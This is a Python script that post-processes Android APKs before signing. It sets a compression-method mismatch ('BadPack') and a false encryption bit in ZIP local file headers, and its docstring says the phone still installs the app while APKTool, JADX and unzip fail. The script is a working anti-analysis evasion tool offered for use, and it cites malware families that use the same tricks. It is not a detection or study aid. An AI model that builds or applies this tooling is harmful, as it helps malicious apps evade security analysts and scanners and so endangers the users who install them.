#!/usr/bin/env python3
"""
badpack_gp_patcher.py — BadPack + GP Encryption Bit Patcher

Technique 1 — BadPack (LFH vs CDH compression mismatch):
    Sets compression method in Local File Header to 0x0000 (STORE)
    while Central Directory Header keeps the real value (0x0008 DEFLATE).
    Android runtime reads CDH only — installs correctly.
    APKTool, JADX, unzip read LFH first — fail or produce garbage.
    Confirmed working: Unit42 research, 9,200 real BadPack samples (2023-2024).

Technique 2 — GP Encryption Bit (bit 0 of General Purpose Bit Flags):
    Sets encryption bit (0x0001) in LFH GP flags field for non-protected entries.
    Android's libziparchive ignores this flag on real entries.
    APKTool, unzip treat entries as password-protected — skip or abort.
    Confirmed working: RatHat malware family (Zimperium, September 2026).

CRITICAL — Pre-sign only:
    V2 signing covers ALL of Section 1 including every LFH byte.
    Any LFH patch post-sign = V2 hash mismatch = install fails.
    This script MUST run BEFORE the final apksigner call.

Usage:
    python3 scripts/badpack_gp_patcher.py <apk_in> <apk_out> --mode companion
    python3 scripts/badpack_gp_patcher.py <apk_in> <apk_out> --mode nova

Protected entries (never patched — Android requires these untouched):
    AndroidManifest.xml, classes*.dex, resources.arsc, *.so, *.bin, *.arsc
"""

import struct
import argparse
import sys
import os

# ── ZIP signatures ─────────────────────────────────────────────────────────────
LFH_SIG  = b'PK\x03\x04'   # Local File Header  (offset 0)
CDH_SIG  = b'PK\x01\x02'   # Central Directory Header
EOCD_SIG = b'PK\x05\x06'   # End of Central Directory

# ── LFH field offsets (from start of LFH signature) ──────────────────────────
LFH_GP_FLAGS_OFF    = 6    # General Purpose Bit Flags (uint16)
LFH_COMPRESS_OFF    = 8    # Compression Method (uint16)
LFH_FNAME_LEN_OFF   = 26   # Filename Length (uint16)
LFH_EXTRA_LEN_OFF   = 28   # Extra Field Length (uint16)
LFH_HEADER_SIZE     = 30   # Fixed header size before filename

# ── CDH field offsets (from start of CDH signature) ───────────────────────────
CDH_COMPRESS_OFF    = 10   # Compression Method (uint16)
CDH_FNAME_LEN_OFF   = 28   # Filename Length (uint16)
CDH_EXTRA_LEN_OFF   = 30   # Extra Field Length (uint16)
CDH_COMMENT_LEN_OFF = 32   # Comment Length (uint16)
CDH_LFH_OFFSET_OFF  = 42   # Relative offset of LFH (uint32)
CDH_HEADER_SIZE     = 46   # Fixed header size before filename

# ── EOCD field offsets ─────────────────────────────────────────────────────────
EOCD_CD_OFFSET_OFF  = 16   # Offset of start of central directory (uint32)
EOCD_CD_SIZE_OFF    = 12   # Size of central directory (uint32)

# ── Compression constants ──────────────────────────────────────────────────────
COMPRESS_STORED  = 0x0000
COMPRESS_DEFLATE = 0x0008

# ── GP flag bits ───────────────────────────────────────────────────────────────
GP_ENCRYPT_BIT = 0x0001    # Bit 0 — encryption flag

# ── Protected entry names — NEVER patch these ─────────────────────────────────
PROTECTED_NAMES = {
    "AndroidManifest.xml",
    "classes.dex",
    "classes2.dex",
    "classes3.dex",
    "classes4.dex",
    "resources.arsc",
}

# ── Protected extensions — NEVER patch these ──────────────────────────────────
PROTECTED_EXTS = {".so", ".dex", ".arsc", ".bin"}


def read_u16(data, off):
    return struct.unpack_from('<H', data, off)[0]


def read_u32(data, off):
    return struct.unpack_from('<I', data, off)[0]


def write_u16(buf, off, v):
    struct.pack_into('<H', buf, off, v & 0xFFFF)


def find_eocd(data):
    """Scan backwards for EOCD signature."""
    for i in range(len(data) - 22, max(len(data) - 65558, -1), -1):
        if data[i:i+4] == EOCD_SIG:
            return i
    raise ValueError("[badpack_gp_patcher] EOCD not found — not a valid ZIP/APK")


def is_protected(fname):
    """Return True if this entry must never be patched."""
    if fname in PROTECTED_NAMES:
        return True
    _, ext = os.path.splitext(fname)
    if ext.lower() in PROTECTED_EXTS:
        return True
    return False


def patch(apk_in, apk_out, mode):
    """
    Apply BadPack + GP encryption bit to all non-protected LFH entries.

    BadPack:
        LFH compression method → 0x0000 (STORE)
        CDH compression method → unchanged (real value, e.g. DEFLATE 0x0008)
        Android reads CDH → works. Parsers read LFH → wrong method → fail.

    GP Encrypt bit:
        LFH GP flags bit 0 → set to 1
        CDH GP flags → unchanged (no encryption bit)
        Android libziparchive ignores encryption bit on non-encrypted data.
        Parsers see encryption bit → treat as password-protected → abort.
    """
    with open(apk_in, 'rb') as f:
        raw = bytearray(f.read())

    # ── Locate EOCD and Central Directory ─────────────────────────────────────
    eocd_off = find_eocd(raw)
    cd_off   = read_u32(raw, eocd_off + EOCD_CD_OFFSET_OFF)
    cd_size  = read_u32(raw, eocd_off + EOCD_CD_SIZE_OFF)

    # ── Build map: filename → real CDH compression method ─────────────────────
    # We walk CDH to know the REAL compression value per entry.
    # LFH will be set to STORE (0x0000) for eligible entries — mismatch.
    cdh_compress_map = {}   # fname -> real_compress_method
    cdh_eligible     = set()  # fnames eligible for patching

    pos = cd_off
    while pos < cd_off + cd_size:
        if raw[pos:pos+4] != CDH_SIG:
            break
        fname_len   = read_u16(raw, pos + CDH_FNAME_LEN_OFF)
        extra_len   = read_u16(raw, pos + CDH_EXTRA_LEN_OFF)
        comment_len = read_u16(raw, pos + CDH_COMMENT_LEN_OFF)
        compress    = read_u16(raw, pos + CDH_COMPRESS_OFF)
        fname       = raw[pos+CDH_HEADER_SIZE : pos+CDH_HEADER_SIZE+fname_len].decode('utf-8', errors='replace')

        cdh_compress_map[fname] = compress
        if not is_protected(fname) and compress == COMPRESS_DEFLATE:
            # Only mismatch DEFLATE entries — STORE entries already match STORE
            # so no mismatch possible. DEFLATE in CDH vs STORE in LFH = true mismatch.
            cdh_eligible.add(fname)

        pos += CDH_HEADER_SIZE + fname_len + extra_len + comment_len

    # ── Walk LFH entries and patch eligible ones ───────────────────────────────
    badpack_count = 0
    gp_count      = 0
    pos = 0

    while pos < cd_off:
        if raw[pos:pos+4] != LFH_SIG:
            pos += 1
            continue

        fname_len = read_u16(raw, pos + LFH_FNAME_LEN_OFF)
        extra_len = read_u16(raw, pos + LFH_EXTRA_LEN_OFF)
        fname     = raw[pos+LFH_HEADER_SIZE : pos+LFH_HEADER_SIZE+fname_len].decode('utf-8', errors='replace')
        compress  = read_u16(raw, pos + LFH_COMPRESS_OFF)
        gp_flags  = read_u16(raw, pos + LFH_GP_FLAGS_OFF)

        if not is_protected(fname):
            # Technique 1 — BadPack: LFH compression → STORE, CDH stays DEFLATE
            if fname in cdh_eligible and compress == COMPRESS_DEFLATE:
                write_u16(raw, pos + LFH_COMPRESS_OFF, COMPRESS_STORED)
                badpack_count += 1

            # Technique 2 — GP encryption bit: set bit 0 in LFH GP flags only
            if not (gp_flags & GP_ENCRYPT_BIT):
                write_u16(raw, pos + LFH_GP_FLAGS_OFF, gp_flags | GP_ENCRYPT_BIT)
                gp_count += 1

        # Advance past this LFH entry
        # compressed_size from LFH (may be 0 for data-descriptor entries — safe to use
        # CDH value instead if zero)
        comp_size = read_u32(raw, pos + 18)
        if comp_size == 0 and fname in cdh_compress_map:
            # Data descriptor entry — use CDH compressed size
            # Walk CDH to get correct size for this filename
            cpos = cd_off
            while cpos < cd_off + cd_size:
                if raw[cpos:cpos+4] != CDH_SIG:
                    break
                cf_len = read_u16(raw, cpos + CDH_FNAME_LEN_OFF)
                ce_len = read_u16(raw, cpos + CDH_EXTRA_LEN_OFF)
                cc_len = read_u16(raw, cpos + CDH_COMMENT_LEN_OFF)
                cf     = raw[cpos+CDH_HEADER_SIZE : cpos+CDH_HEADER_SIZE+cf_len].decode('utf-8', errors='replace')
                if cf == fname:
                    comp_size = read_u32(raw, cpos + 20)
                    break
                cpos += CDH_HEADER_SIZE + cf_len + ce_len + cc_len

        pos += LFH_HEADER_SIZE + fname_len + extra_len + comp_size

    # ── Write output ───────────────────────────────────────────────────────────
    with open(apk_out, 'wb') as f:
        f.write(raw)

    print(f"[badpack_gp_patcher] mode={mode}")
    print(f"[badpack_gp_patcher] BadPack LFH compression mismatch applied: {badpack_count} entries")
    print(f"[badpack_gp_patcher] GP encryption bit set in LFH: {gp_count} entries")
    print(f"[badpack_gp_patcher] Protected entries skipped (never touched)")
    print(f"[badpack_gp_patcher] ✅ Done: {apk_out}")


def main():
    parser = argparse.ArgumentParser(description='BadPack + GP Encryption Bit Patcher')
    parser.add_argument('apk_in',  help='Input APK path')
    parser.add_argument('apk_out', help='Output APK path')
    parser.add_argument('--mode',  choices=['nova', 'companion'], required=True,
                        help='nova or companion — controls logging only')
    args = parser.parse_args()

    if not os.path.isfile(args.apk_in):
        print(f"[badpack_gp_patcher] ERROR: input not found: {args.apk_in}")
        sys.exit(1)

    patch(args.apk_in, args.apk_out, args.mode)


if __name__ == '__main__':
    main()
